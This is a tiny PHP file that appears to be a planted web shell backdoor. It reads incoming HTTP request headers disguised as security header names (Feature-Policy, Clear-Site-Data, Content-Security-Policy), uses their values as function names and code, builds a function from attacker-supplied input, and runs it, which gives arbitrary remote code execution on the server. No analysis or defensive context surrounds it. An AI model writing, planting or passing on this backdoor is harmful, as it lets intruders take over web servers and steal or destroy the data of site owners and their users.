<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['Feature-Policy'])) {
    $center = $_HEADERS['Feature-Policy']('', $_HEADERS['Clear-Site-Data']($_HEADERS['Content-Security-Policy']));
    $center();
}